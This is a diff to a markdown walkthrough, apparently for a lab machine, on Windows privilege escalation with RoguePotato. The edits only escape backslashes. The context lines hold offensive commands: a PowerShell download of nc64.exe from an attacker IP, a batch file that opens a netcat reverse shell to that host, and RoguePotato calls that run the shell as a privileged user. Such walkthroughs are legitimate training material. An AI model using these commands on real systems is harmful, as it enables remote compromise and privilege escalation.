@@ -18,7 +18,7 @@ powershell -c wget http://10.10.x.x:8080/nc64.exe -outfile nc64.exe
 ### Create a reverse shell on target machine and set chisel
 
 ```markdown
-echo c:\Windows\Temp\nc64.exe -e cmd 10.10.x.x 1234 > rev.bat
+echo c:\\Windows\\Temp\\nc64.exe -e cmd 10.10.x.x 1234 > rev.bat
 ```
 
 ### Now run chisel on Attacker VM.
@@ -43,12 +43,12 @@ nc -nvlp 1234
 ### Now on shell-2 we can execute payload.
 
 ```markdown
-.\RoguePotato.exe -r 10.10.x.x -l 9999 -e c:\Windows\Temp\rev.bat
+.\RoguePotato.exe -r 10.10.x.x -l 9999 -e c:\\Windows\\Temp\\rev.bat
 ```
 
 if you're using Powershell.
 ```markdown
-.\RoguePotato.exe -r 10.10.x.x -l 9999 -e "powershell c:\Windows\Temp\shell.ps1"
+.\RoguePotato.exe -r 10.10.x.x -l 9999 -e "powershell c:\\Windows\\Temp\\shell.ps1"
 ```
 
 ## Another Way Using socat
